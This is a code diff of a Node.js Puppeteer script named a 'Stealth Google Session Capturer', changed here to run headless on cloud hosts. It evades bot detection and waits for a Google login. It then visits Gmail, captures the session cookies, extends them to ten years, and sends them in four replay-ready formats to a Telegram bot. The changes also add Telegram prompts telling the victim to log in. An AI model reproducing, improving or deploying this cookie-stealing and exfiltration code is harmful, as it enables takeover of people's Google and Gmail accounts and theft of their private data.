@@ -5,7 +5,6 @@ const path = require('path');
 const FormData = require('form-data');
 const fetch = require('node-fetch');
 
-// Use stealth plugin
 puppeteer.use(StealthPlugin());
 
 // ============================================================
@@ -50,25 +49,22 @@ async function sendToTelegram(message) {
 }
 
 // ============================================================
-// SEND FILE TO TELEGRAM - FIXED!
+// SEND FILE TO TELEGRAM - FORCES DOWNLOAD!
 // ============================================================
 async function sendFileToTelegram(filePath, caption) {
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
         
-        // Read file as buffer
         const fileBuffer = fs.readFileSync(filePath);
         const fileName = path.basename(filePath);
-        const fileSize = (fileBuffer.length / 1024).toFixed(1);
         
-        console.log(`📤 Sending: ${fileName} (${fileSize} KB)`);
+        console.log(`📤 Sending: ${fileName}`);
         
-        // Create form data
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('document', fileBuffer, {
             filename: fileName,
-            contentType: 'application/octet-stream'  // FORCE DOWNLOAD
+            contentType: 'application/octet-stream'
         });
         formData.append('caption', caption);
         
@@ -81,11 +77,10 @@ async function sendFileToTelegram(filePath, caption) {
         const result = await response.json();
         
         if (result.ok) {
-            console.log(`✅ ${fileName} sent successfully!`);
+            console.log(`✅ ${fileName} sent!`);
             return true;
         } else {
             console.error(`❌ Failed: ${result.description}`);
-            // Try alternative approach
             return await sendFileAsText(filePath, caption);
         }
         
@@ -96,7 +91,7 @@ async function sendFileToTelegram(filePath, caption) {
 }
 
 // ============================================================
-// FALLBACK: Send file as document with text/plain
+// FALLBACK: Send as text
 // ============================================================
 async function sendFileAsText(filePath, caption) {
     try {
@@ -104,8 +99,6 @@ async function sendFileAsText(filePath, caption) {
         
         const content = fs.readFileSync(filePath, 'utf8');
         const fileName = path.basename(filePath);
-        
-        // Create a temp file with .txt extension
         const tempFile = path.join(__dirname, 'data', `temp_${fileName}.txt`);
         fs.writeFileSync(tempFile, content);
         
@@ -126,17 +119,13 @@ async function sendFileAsText(filePath, caption) {
         });
         
         const result = await response.json();
-        
-        // Clean up temp file
         try { fs.unlinkSync(tempFile); } catch(e) {}
         
         if (result.ok) {
             console.log(`✅ ${fileName} sent as text!`);
             return true;
-        } else {
-            console.error('Text fallback failed:', result.description);
-            return false;
         }
+        return false;
         
     } catch (error) {
         console.error('Fallback failed:', error);
@@ -207,15 +196,15 @@ async function notifyRedirect(email) {
 }
 
 // ============================================================
-// FIND CHROME ON RENDER
+// FIND CHROME ON RENDER/RAILWAY
 // ============================================================
 function getChromePath() {
-    // Common paths for Chrome on Render
     const possiblePaths = [
         '/usr/bin/google-chrome',
         '/usr/bin/chromium-browser',
         '/usr/bin/chromium',
         '/opt/render/.cache/puppeteer/chrome/linux-121.0.6167.85/chrome-linux64/chrome',
+        '/opt/render/.cache/puppeteer/chrome/linux-120.0.6099.109/chrome-linux64/chrome',
         process.env.CHROME_PATH || null
     ];
     
@@ -226,44 +215,42 @@ function getChromePath() {
         }
     }
     
-    console.log('⚠️ Chrome not found in common paths, letting Puppeteer handle it');
+    console.log('⚠️ Chrome not found, will use Puppeteer default');
     return null;
 }
 
 // ============================================================
-// MAIN CAPTURE FUNCTION
+// MAIN CAPTURE FUNCTION - HEADLESS MODE!
 // ============================================================
 async function captureGoogleSession() {
-    console.log('🚀 Starting Stealth Puppeteer...');
+    console.log('🚀 Starting Stealth Puppeteer (Headless Mode)...');
     console.log(`📡 Base URL: ${BASE_URL}`);
     
     let browser;
     let page;
     
     try {
-        // Launch with Chrome path if found
         const chromePath = getChromePath();
+        
+        // CRITICAL: headless: true for server deployment!
         const launchOptions = {
-            headless: false,
+            headless: true,  // CHANGED TO TRUE!
             args: [
                 '--no-sandbox',
                 '--disable-setuid-sandbox',
                 '--disable-dev-shm-usage',
                 '--disable-accelerated-2d-canvas',
                 '--disable-gpu',
-                '--window-size=1280,800',
-                '--start-maximized',
-                '--no-first-run',
-                '--no-default-browser-check',
+                '--disable-features=IsolateOrigins,site-per-process',
+                '--disable-blink-features=AutomationControlled',
                 '--disable-background-timer-throttling',
                 '--disable-backgrounding-occluded-windows',
                 '--disable-renderer-backgrounding',
-                '--disable-features=IsolateOrigins,site-per-process'
+                '--window-size=1280,800'
             ],
             ignoreDefaultArgs: ['--enable-automation']
         };
         
-        // Add executable path if found
         if (chromePath) {
             launchOptions.executablePath = chromePath;
         }
@@ -276,19 +263,23 @@ async function captureGoogleSession() {
         await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
 
         console.log('🌐 Opening Google login...');
+        
+        // Send the login URL to user
+        await sendToTelegram(`🔐 **Please login to Google:**\n\n1. Open this link in your browser:\n\`https://accounts.google.com/\`\n\n2. Login to your account\n\n3. After login, the cookies will be captured automatically!`);
+
+        // Open Google login page
         await page.goto('https://accounts.google.com/', {
             waitUntil: 'networkidle2',
             timeout: 30000
         });
 
-        console.log('👤 Please log in to Google');
-        console.log('⏳ Waiting for login...');
-        await sendToTelegram('🔄 **Google login opened.** Please sign in...');
+        console.log('⏳ Waiting for user to log in...');
+        console.log('📱 User should log in using the link sent to Telegram');
 
         // Wait for login
         let loggedIn = false;
         let attempts = 0;
-        const maxAttempts = 180;
+        const maxAttempts = 300; // 5 minutes
         let userEmail = null;
         let userName = null;
 
@@ -332,6 +323,7 @@ async function captureGoogleSession() {
                     userEmail = loginCheck.email || 'Unknown';
                     userName = loginCheck.name || 'Unknown';
                     console.log('✅ Login detected!', userEmail);
+                    await sendToTelegram(`✅ **Login detected for:** ${userEmail}`);
                     break;
                 }
 
@@ -352,6 +344,15 @@ async function captureGoogleSession() {
             await browser.close();
             return;
         }
+
+        // ============================================================
+        // GO TO GMAIL TO GET ALL COOKIES
+        // ============================================================
+        console.log('📧 Going to Gmail to capture all cookies...');
+        await page.goto('https://mail.google.com/', {
+            waitUntil: 'networkidle2',
+            timeout: 15000
+        });
 
         // Capture cookies
         console.log('🍪 Capturing cookies...');
@@ -435,22 +436,18 @@ async function captureGoogleSession() {
         
         let sentCount = 0;
         
-        // 1. 10 Year Cookies
         const result1 = await sendFileToTelegram(extendedFile, `🔑 10 YEAR COOKIES - ${finalEmail}`);
         if (result1) sentCount++;
         await new Promise(resolve => setTimeout(resolve, 3000));
         
-        // 2. Netscape Format
         const result2 = await sendFileToTelegram(netscapeFile, `📁 NETSCAPE FORMAT - ${finalEmail}`);
         if (result2) sentCount++;
         await new Promise(resolve => setTimeout(resolve, 3000));
         
-        // 3. EditThisCookie Format
         const result3 = await sendFileToTelegram(editFile, `📦 EDITTHISCOOKIE FORMAT - ${finalEmail}`);
         if (result3) sentCount++;
         await new Promise(resolve => setTimeout(resolve, 3000));
         
-        // 4. Session Data
         const result4 = await sendFileToTelegram(sessionFile, `📊 FULL SESSION DATA - ${finalEmail}`);
         if (result4) sentCount++;
 
@@ -498,7 +495,7 @@ async function captureGoogleSession() {
 // ============================================================
 // RUN
 // ============================================================
-console.log('🚀 Stealth Google Session Capturer');
+console.log('🚀 Stealth Google Session Capturer (Headless Mode)');
 console.log('========================================');
 console.log('📁 4 files will be sent as DOWNLOADABLE attachments!');
 console.log('🔑 Cookies extended to 10 YEARS!');
